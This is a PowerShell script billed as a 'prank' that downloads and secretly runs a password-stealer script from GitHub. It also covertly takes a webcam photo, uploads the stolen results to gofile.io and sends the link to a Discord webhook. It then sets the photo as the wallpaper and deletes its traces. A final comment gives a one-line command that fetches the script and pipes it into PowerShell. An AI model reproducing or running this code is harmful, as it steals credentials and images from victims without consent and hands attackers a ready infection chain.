# Create C:\Temp if it does not exists
if (-not (Test-Path -Path "C:\Temp")) {
    New-Item -Path "C:\Temp" -ItemType Directory
}
# Change directory to C:\Temp
Set-Location C:\Temp

# Define the Discord webhook URL
$webhook = "https://discord.com/api/webhooks/1291112619054338182/RlsoBpv3pfU_to4nY6U_u8d8jpMVNmWUzPFWvJQgIRvtiL6K3jxQsFH3lj7KEjUjDEV7"

function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )
    $uploadUri = "https://store1.gofile.io/uploadFile"
    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
        "Content-Type: application/octet-stream",
        $LF,
        $fileEnc,
        "--$boundary--",
        $LF
    ) -join $LF

    # Upload the file
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        if ($response.status -ne "ok") {
            Write-Host "Failed to upload file: $($response.status)"
            return $null
        }
        return $response.data.downloadPage
    } catch {
        Write-Host "Failed to upload file: $_"
        return $null
    }
}

# 1. Run full screen Prank
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/script.py' -OutFile 'script.py'
Start-Process python.exe -ArgumentList 'script.py'

# 2. Take photo from web cam
Invoke-WebRequest https://signalswim.com/downloads/CommandCam.exe -OutFile CommandCam.exe
Start-Process -WindowStyle Hidden .\CommandCam.exe -ArgumentList "/filename C:\Temp\prank.bmp /delay 500 /quiet"

# 3. Download password stealer
Invoke-WebRequest https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/stealer.py -OutFile C:\Temp\stealer.py

# 4. run password stealer
Start-Process -WindowStyle Hidden python.exe -ArgumentList 'C:\Temp\stealer.py'

# 5. Send the result to Gofile and get the download link
$link = Upload-FileAndGetLink -filePath C:\Temp\result.zip
# $link = "test"

# 6. Send the download link to Discord
Send-DiscordMessage -message $link

# 7. Set wallpaper
$imgPath = "C:\Temp\prank.bmp"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, (0x01 -bor 0x02))

# 8. Delete temp directory contetns
# Remove-Item -Force -Recurse C:\Temp\*
Start-Process -Wait Remove-Item -ArgumentList "-Force -Recurse C:\Temp\*"


# powershell -NoExit -command "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
